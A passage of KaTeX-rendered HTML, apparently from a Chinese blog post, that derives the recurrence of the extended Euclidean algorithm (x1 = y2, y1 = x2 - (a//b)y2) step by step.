style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mi>x</mi><mo>+</mo><mo stretchy="false">(</mo><mi>a</mi><mi mathvariant="normal">%</mi><mi>b</mi><mo stretchy="false">)</mo><mi>y</mi><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mi mathvariant="normal">%</mi><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">bx + (a \% b)y = gcd(b, a\%b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mord">%</span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mord">%</span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span></p><p>假设一个式子得解为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_1, y_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。第二个式子得解为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_2,y_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，代入等式。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><msub><mi>y</mi><mn>1</mn></msub><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ax_1+by_1=gcd(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><mo stretchy="false">(</mo><mi>a</mi><mi mathvariant="normal">%</mi><mi>b</mi><mo stretchy="false">)</mo><msub><mi>y</mi><mn>2</mn></msub><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mi mathvariant="normal">%</mi><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">bx_2 + (a \% b)y_2 = gcd(b, a\%b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault">b</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mord">%</span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mord">%</span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span></p><p>而两个等式右边是相等得，就是辗转相除法嘛2333。</p><p>所以 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><msub><mi>y</mi><mn>1</mn></msub><mo>=</mo><mi>b</mi><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><mo stretchy="false">(</mo><mi>a</mi><mi mathvariant="normal">%</mi><mi>b</mi><mo stretchy="false">)</mo><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">ax_1 + by_1 = bx_2 + (a\%b)y_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault">b</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mord">%</span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi mathvariant="normal">%</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">a\%b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord mathdefault">a</span><span class="mord">%</span><span class="mord mathdefault">b</span></span></span></span>等价转化为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>−</mo><mo stretchy="false">(</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>b</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a - (a //b) * b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mord">/</span><span class="mord">/</span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span>，再代入。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⇒</mo><mi>a</mi><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><msub><mi>y</mi><mn>1</mn></msub><mo>=</mo><mi>b</mi><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><mo stretchy="false">(</mo><mi>a</mi><mo>−</mo><mo stretchy="false">(</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>b</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>b</mi><mo stretchy="false">)</mo><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\Rightarrow ax_1 + by_1 = bx_2 + (a - (a//b) * b)y_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault">b</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mord">/</span><span class="mord">/</span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⇒</mo><mi>a</mi><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><msub><mi>y</mi><mn>1</mn></msub><mo>=</mo><mi>b</mi><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><mi>a</mi><msub><mi>y</mi><mn>2</mn></msub><mo>−</mo><mo stretchy="false">(</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>b</mi><mo stretchy="false">)</mo><mo>∗</mo><mi>b</mi><msub><mi>y</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\Rightarrow ax_1 + by_1 = bx_2 + ay_2 - (a//b)*by_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault">b</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mord">/</span><span class="mord">/</span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⇒</mo><mi>a</mi><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><msub><mi>y</mi><mn>1</mn></msub><mo>=</mo><mi>a</mi><msub><mi>y</mi><mn>2</mn></msub><mo>+</mo><mi>b</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo>−</mo><mo stretchy="false">(</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>b</mi><mo stretchy="false">)</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\Rightarrow ax_1 + by_1 = ay_2 + b(x_2 - (a//b)y_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mord">/</span><span class="mord">/</span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⇒</mo><msub><mi>x</mi><mn>1</mn></msub><mo>=</mo><msub><mi>y</mi><mn>2</mn></msub><mtext> </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext> </mtext><msub><mi>y</mi><mn>1</mn></msub><mo>=</mo><mo 